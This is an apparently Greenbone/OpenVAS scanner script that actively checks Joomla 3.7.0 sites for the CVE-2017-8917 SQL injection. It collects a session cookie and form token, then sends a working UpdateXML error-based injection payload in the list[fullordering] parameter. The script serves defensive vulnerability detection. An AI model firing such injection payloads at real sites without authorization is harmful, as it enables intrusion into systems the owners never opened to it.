# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811044");
  script_version("2024-09-10T05:05:42+0000");
  script_tag(name:"last_modification", value:"2024-09-10 05:05:42 +0000 (Tue, 10 Sep 2024)");
  script_tag(name:"creation_date", value:"2017-05-18 10:39:51 +0530 (Thu, 18 May 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-04-16 14:35:00 +0000 (Tue, 16 Apr 2019)");

  script_cve_id("CVE-2017-8917");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Joomla! < 3.7.1 SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Joomla is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP GET and checks whether
  it is possible to conduct an SQL injection attack.");

  script_tag(name:"insight", value:"The flaw exists due to an inadequate filtering of request data
  input.");

  script_tag(name:"impact", value:"Successfully exploiting this issue allow remote attackers to
  execute arbitrary SQL commands via unspecified vectors.");

  script_tag(name:"affected", value:"Joomla version 3.7.0 and prior.");

  script_tag(name:"solution", value:"Update to version 3.7.1 or later.");

  script_xref(name:"URL", value:"https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/98515");
  script_xref(name:"URL", value:"https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html");
  script_xref(name:"URL", value:"https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php/component/users/?view=login";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200") {
  cookie = http_get_cookie_from_header(buf: res, pattern: "[Ss]et-[Cc]ookie\s*:\s*([^; ]+)");
  if (!cookie)
    exit(0);

  fieldset = egrep(string: res, pattern: '<input\\s+type="hidden"\\s+name="([^"]+).*</fieldset>');
  if (!fieldset)
    exit(0);

  fieldsetid = eregmatch(pattern: '".name="([^"]+)"', string: fieldset);
  if (isnull(fieldsetid[1]))
    exit(0);

  url = dir + "/index.php?option=com_fields&view=fields&layout=modal&view=" +
              "fields&layout=modal&option=com_fields&" + fieldsetid[1] +
              "=1&list%5Bfullordering%5D=UpdateXML%282%2C+concat%280x3a%2C128%2B127%2C+0x3a%29%2C+1%29";

  if (http_vuln_check(port: port, url: url, cookie: cookie, pattern:"HTTP/1\.[01] 500",
                      extra_check: make_list("Home Page<",
                                            "XPATH syntax error:\s*&#039;.255.&#039;\s*</"))) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }

  exit(99);
}

exit(0);
